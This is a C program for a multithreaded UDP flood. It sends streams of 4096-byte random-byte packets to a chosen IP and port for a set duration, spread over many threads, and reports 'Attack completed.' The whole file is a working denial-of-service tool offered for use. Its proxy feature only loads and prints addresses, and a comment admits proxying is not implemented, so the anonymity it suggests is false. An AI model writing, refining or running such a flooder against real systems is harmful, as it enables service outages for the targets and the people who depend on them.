#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <arpa/inet.h>

#define MAX_PAYLOAD_SIZE 4096
#define MAX_PROXY_COUNT 10
#define PROXY_LENGTH 100

struct thread_data {
    char ip[16];
    int port;
    int time;
};

char proxy_list[MAX_PROXY_COUNT][PROXY_LENGTH];
int proxy_count = 0;

void load_proxies(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("Could not open proxy list file");
        exit(EXIT_FAILURE);
    }

    while (fgets(proxy_list[proxy_count], PROXY_LENGTH, file) && proxy_count < MAX_PROXY_COUNT) {
        size_t len = strlen(proxy_list[proxy_count]);
        if (proxy_list[proxy_count][len - 1] == '\n') {
            proxy_list[proxy_count][len - 1] = '\0';
        }
        proxy_count++;
    }

    fclose(file);
    if (proxy_count == 0) {
        fprintf(stderr, "No proxies loaded. Ensure the proxy list is populated.\n");
        exit(EXIT_FAILURE);
    }
}

char *get_random_proxy() {
    return proxy_list[rand() % proxy_count];
}

void generate_payload(char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] = (rand() % 256); // Random byte between 0-255
    }
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    char payload[MAX_PAYLOAD_SIZE];

    char *proxy = get_random_proxy();
    printf("Using proxy: %s\n", proxy);

    // Configure socket to use proxy if needed (implementation depends on proxy type, e.g., SOCKS5)

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        generate_payload(payload, MAX_PAYLOAD_SIZE);

        if (sendto(sock, payload, MAX_PAYLOAD_SIZE, 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <THREADS> <DURATION> <PROXY_FILE>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int duration = atoi(argv[4]);
    char *proxy_file = argv[5];

    load_proxies(proxy_file);

    pthread_t thread_pool[threads];
    struct thread_data t_data;

    strncpy(t_data.ip, ip, sizeof(t_data.ip));
    t_data.port = port;
    t_data.time = duration;

    srand(time(NULL));

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_pool[i], NULL, attack, (void *)&t_data) != 0) {
            perror("Thread creation failed");
            return EXIT_FAILURE;
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    printf("Attack completed.\n");
    return EXIT_SUCCESS;
}
